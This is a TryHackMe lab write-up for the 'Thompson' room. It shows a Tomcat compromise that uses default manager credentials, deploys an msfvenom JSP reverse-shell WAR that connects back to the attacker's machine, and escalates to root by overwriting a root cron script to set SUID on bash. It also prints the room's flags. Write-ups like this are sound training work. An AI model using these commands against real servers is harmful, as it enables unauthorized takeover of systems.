# 🛡️ TryHackMe – Thompson - Writeup

## 📌 Overview
**Room Name:** Thompson  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Apache Tomcat / WAR Deployment / Cron / PrivEsc

Linux machine running Apache Tomcat 8.5.5. The Manager App error page leaks default credentials, allowing WAR-based reverse shell deployment. A world-writable cron script executed by root completes the escalation.

Attack chain overview:

- Port scan revealing SSH, AJP (8009), and Tomcat 8.5.5 on port 8080
- Manager App error page exposes default credentials (`tomcat:s3cret`)
- msfvenom WAR payload deployed via Manager App → shell as `tomcat`
- World-writable `/home/jack/id.sh` executed by root cron every minute
- Overwrite `id.sh` with SUID `bash` command → `bash -p` → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -- -sV -sC
```

```text
22/tcp   open  ssh     OpenSSH 7.2p2
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```

Port 8009 running AJP (Apache Jserv Protocol) externally exposed on a Tomcat 8.5.5 instance immediately suggested CVE-2020-1938 (Ghostcat) as a potential vector. However, browsing to port 8080 revealed a more direct path through the Tomcat Manager App.

---

## 🔍 2. Manager App — Credential Leak

Browsing to `http://<TARGET_IP>:8080` confirmed version 8.5.5 and showed the Manager App button. The default page also noted:

```
Users are defined in: $CATALINA_HOME/conf/tomcat-users.xml
```

Accessing the Manager App prompted for authentication:

```
http://<TARGET_IP>:8080/manager/html
```

The HTTP 401 error page — shown when login is cancelled — contained a sample `tomcat-users.xml` snippet with credentials embedded directly in the error message:

```xml
<user username="tomcat" password="s3cret" roles="manager-gui,admin-gui"/>
```

> **Why this matters:** This is a known Tomcat misconfiguration. The error page includes sample credentials that operators often copy verbatim into production configs. Checking the error page before reaching for brute-force tools is always worth doing.

Logging in with `tomcat:s3cret` granted full Manager App access. ✅

---

## 🔓 3. Initial Access — WAR Deployment

### WAR Payload Generation

Tomcat executes Java web applications packaged as WAR (Web Application Archive) files — the Java equivalent of uploading a PHP shell. PHP payloads are incompatible; a JSP-based payload is required.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI_IP> LPORT=8000 -f war -o exploit.war
```

`jsp_shell_reverse_tcp` was chosen because WAR files are expanded as JSP applications, making it the most compatible payload format.

### Identifying the JSP Filename

The WAR was uploaded and deployed via the Manager App's **Deploy** section. Triggering it required the exact JSP filename inside the archive:

```bash
jar -tf exploit.war
```

```text
WEB-INF/
WEB-INF/web.xml
scqyuqknqmeiy.jsp
```

> **Why `/exploit` alone doesn't work:** Browsing to `http://<TARGET_IP>:8080/exploit` reaches the application root, but the payload lives in the named JSP file. Without specifying that filename, the server returns a 404 — the shell is never triggered.

Started a listener and triggered the payload:

```bash
nc -lvnp 8000
```

```
http://<TARGET_IP>:8080/exploit/scqyuqknqmeiy.jsp
```

```bash
python -c 'import pty; pty.spawn("/bin/bash");'
whoami
# tomcat
```

**Initial access as `tomcat` achieved.** ✅

---

## 🔍 4. Post-Exploitation Enumeration

```bash
ls -la /home/jack
```

```text
-rwxrwxrwx  jack  id.sh
-rw-r--r--  root  test.txt    ← root-owned, recent timestamp
-rw-rw-r--  jack  user.txt
```

Two observations stood out:

- `id.sh` had `rwxrwxrwx` permissions — world-writable
- `test.txt` was owned by root with a recent modification timestamp, implying automated writes

```bash
cat id.sh
# #!/bin/bash
# id > test.txt

cat /etc/crontab
```

```text
*  *  *  *  *  root  cd /home/jack && bash id.sh
```

`id.sh` writes the output of `id` into `test.txt`, and root runs it every minute. Since `id.sh` is world-writable, the attack chain is complete.

---

## 👑 5. Privilege Escalation — Writable Cron Script

Overwrote `id.sh` using `echo`:

```bash
echo 'chmod u+s /bin/bash' > id.sh
```

After one minute, cron executed the script as root, setting the SUID bit on `/bin/bash`:

```bash
bash -p
whoami
# root
```

- `chmod u+s /bin/bash` — sets the SUID bit, making `/bin/bash` run as its owner (root)
- `bash -p` — launches bash in privileged mode, preserving the effective UID from the SUID bit

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
39400c90bc683a41a8935e4719f1
```

### 👑 Root Flag

```
d89d5391984c0450a95497153ae7ca3a
```

---

## 📚 Key Takeaways

- 🔐 **Tomcat Manager App error pages can leak credentials:** The 401 page includes a sample `tomcat-users.xml` snippet. Default credentials copied from documentation into production configs are a well-known class of misconfiguration — always check the error page before reaching for brute-force tools.

- 📦 **WAR deployment requires the JSP filename to trigger execution:** Deploying a WAR and browsing to `/appname` does nothing if the payload is inside a named JSP file. Use `jar -tf` to inspect the archive contents and construct the correct URL.

- 📁 **Recent timestamps on root-owned files signal cron activity:** `test.txt` had a fresh modification time and was owned by root — a clear indicator of scheduled execution. Observing file metadata before reading `crontab` is a fast way to spot cron abuse.

- ⚠️ **World-writable scripts run by root are instant privilege escalation:** `rwxrwxrwx` on any file executed by a privileged cron job is a complete attack chain. The combination of file permissions and scheduled execution is more dangerous than either alone.

---

## 🛠️ Tools Used

- `rustscan`
- `msfvenom`
- `jar` (WAR inspection)
- `nc` (netcat)
- `python` (PTY stabilization)

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
